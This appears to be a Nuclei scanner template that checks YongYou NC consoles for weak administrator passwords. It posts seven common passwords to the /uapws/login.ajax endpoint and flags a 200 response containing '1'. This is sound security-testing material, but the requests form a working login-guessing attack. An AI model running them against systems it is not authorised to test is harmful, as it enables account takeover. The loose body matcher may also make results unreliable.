id: yongyou-nc-console-password-bypass
info:
  name: YongYou NC Console Password Bypass
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
  description: |
    This template identifies a password bypass vulnerability in YongYou NC Console by testing default and weak credentials.

variables:
  passwords:
    - "123456"
    - "111111"
    - "admin"
    - "1"
    - "123"
    - "password"
    - "admin123"

http:
  - raw:
      - |
        POST /uapws/login.ajax HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        name=administrator&password={{passwords}}
    attack: pitchfork
    payloads:
      passwords:
        - "123456"
        - "111111"
        - "admin"
        - "1"
        - "123"
        - "password"
        - "admin123"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "1"
